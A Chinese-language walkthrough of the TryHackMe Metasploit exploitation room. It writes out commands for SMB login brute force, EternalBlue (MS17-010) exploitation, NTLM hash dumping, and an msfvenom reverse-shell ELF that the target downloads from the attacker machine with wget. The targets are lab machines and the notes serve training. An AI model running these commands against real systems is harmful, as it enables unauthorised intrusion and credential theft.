> https://tryhackme.com/room/metasploitexploitation
> #Metasploit #Offensive 
# Task 1 Introduction

前置介绍，并且提供了一份字典文件

# Task 2 Scanning

怀疑是远程环境有问题，在做SMB扫描的时候结果有误，通过OpenVPN连接到远程靶机用nmap做端口扫描的时候，结果也与标答不一致

第一空-扫描开放的端口，共开放了5个端口
![[Pasted image 20221216163045.png]]
第二空-扫描NetBIOS的名字
![[Pasted image 20221216161112.png]]
第三空-扫描特定端口上的服务类型
```shell
use scanner/http/http_version
set rport 8000
```
![[Pasted image 20221216163249.png]]
第四空-
```shell
use auxiliary/scanner/smb/smb_login
set smbuser penny
set PASS_FILE ./wordlists/MetasploitWordlist.txt
exploit
```
![[Pasted image 20221216164431.png]]
![[Pasted image 20221216164408.png]]

# Task 3 The Metasploit Database

介绍了`Metasploit`的数据库功能，方便进行项目管理

# Task 4 Vulnerability Scanning

介绍了漏扫的前置知识
```shell
info auxiliary/scanner/smtp/smtp_relay
```
![[Pasted image 20221216170938.png]]
![[Pasted image 20221216170948.png]]

# Task 5 Exploitation

对目标靶机进行漏扫，利用漏洞并进入靶机

第一空-利用漏洞
```shell
use auxiliary/scanner/smb/smb_ms17_010
setg 10.10.176.116
run
```
![[Pasted image 20221216172629.png]]
经过验证，确定远程为`Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)`，并且存在永恒之蓝
接下来开始利用
```shell
use exploit/windows/smb/ms17_010_eternalblue
exploit
```
![[Pasted image 20221216172905.png]]
成功进入远程目标

第二空-读取`flag.txt`文件内的数据
利用`meterpreter`的`search`功能进行读取
```shell
search -f flag.txt
```
![[Pasted image 20221216173224.png]]
然后就可以进入shell进行读取
![[Pasted image 20221216173330.png]]

第三空-获取`pirate`用户的NTLM哈希值
```shell
hashdump
```
![[Pasted image 20221216173609.png]]
直接用`meterpreter`内置的`hashdump`就可以，但是用插件也是一样的
```shell
use post/windows/gather/hashdump
set SESSION 1
```
![[Pasted image 20221216174341.png]]

# Task 6 Msfvenom

介绍了如何使用`Msfvenom`生成可执行文件类型的载荷

```shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.122.193 LPORT=7777 -f elf > rev_shell.elf
```
生成一个基于`linux/x86/meterpreter/reverse_tcp`的，`elf`格式的反向弹shell的马

然后在远程靶机上执行
```shell
wget 10.10.122.193:10000/rev_shell.elf
chmod +x rev_shell.elf
```
![[Pasted image 20221216185633.png]]
成功从攻击机上下载下来载荷

然后在攻击机上执行
```shell
use exploit/multi/handler
set lhost 10.10.122.193
set lport 10001
```
*中间更改过端口，并且将马换为用Python3来驱动*
在远程靶机上执行马，收到反弹的shell
![[Pasted image 20221216190736.png]]
将`Session`转为后台保存之后，利用`linux/gather/hashdump`负载成功获取其他用户的哈希值
![[Pasted image 20221216191048.png]]


# Task 7 Summary

总结